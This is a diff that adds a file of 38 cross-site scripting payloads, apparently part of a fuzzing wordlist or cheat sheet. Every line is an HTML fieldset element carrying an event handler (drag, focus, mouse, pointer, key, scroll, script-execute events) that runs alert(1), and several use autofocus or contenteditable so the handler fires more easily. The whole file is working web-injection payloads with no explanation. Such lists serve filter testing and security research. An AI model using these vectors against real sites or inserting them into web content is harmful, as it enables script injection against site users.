@@ -1,0 +1,38 @@
+<fieldset contenteditable onbeforeinput=alert(1)>test
+<fieldset draggable="true" ondrag="alert(1)" style=display:block>test</fieldset>
+<fieldset draggable="true" ondragend="alert(1)" style=display:block>test</fieldset>
+<fieldset draggable="true" ondragenter="alert(1)" style=display:block>test</fieldset>
+<fieldset draggable="true" ondragleave="alert(1)" style=display:block>test</fieldset>
+<fieldset draggable="true" ondragstart="alert(1)" style=display:block>test</fieldset>
+<fieldset id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></fieldset>
+<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
+<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
+<fieldset onafterscriptexecute=alert(1)><script>1</script>
+<fieldset onbeforescriptexecute=alert(1)><script>1</script>
+<fieldset onblur=alert(1) id=x tabindex=1 style=display:block>test</fieldset><input value=clickme>
+<fieldset onclick="alert(1)" style=display:block>test</fieldset>
+<fieldset oncontextmenu="alert(1)" style=display:block>test</fieldset>
+<fieldset oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<fieldset oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<fieldset ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</fieldset>
+<fieldset onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</fieldset><input value=clickme>
+<fieldset onkeydown="alert(1)" contenteditable style=display:block>test</fieldset>
+<fieldset onkeypress="alert(1)" contenteditable style=display:block>test</fieldset>
+<fieldset onkeyup="alert(1)" contenteditable style=display:block>test</fieldset>
+<fieldset onmousedown="alert(1)" style=display:block>test</fieldset>
+<fieldset onmouseenter="alert(1)" style=display:block>test</fieldset>
+<fieldset onmouseleave="alert(1)" style=display:block>test</fieldset>
+<fieldset onmousemove="alert(1)" style=display:block>test</fieldset>
+<fieldset onmouseout="alert(1)" style=display:block>test</fieldset>
+<fieldset onmouseover="alert(1)" style=display:block>test</fieldset>
+<fieldset onmouseup="alert(1)" style=display:block>test</fieldset>
+<fieldset onmousewheel=alert(1) style=display:block>requires scrolling
+<fieldset onpointerdown=alert(1) style=display:block>XSS</fieldset>
+<fieldset onpointerenter=alert(1) style=display:block>XSS</fieldset>
+<fieldset onpointerleave=alert(1) style=display:block>XSS</fieldset>
+<fieldset onpointermove=alert(1) style=display:block>XSS</fieldset>
+<fieldset onpointerout=alert(1) style=display:block>XSS</fieldset>
+<fieldset onpointerover=alert(1) style=display:block>XSS</fieldset>
+<fieldset onpointerrawupdate=alert(1) style=display:block>XSS</fieldset>
+<fieldset onpointerup=alert(1) style=display:block>XSS</fieldset>
+<fieldset onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></fieldset>
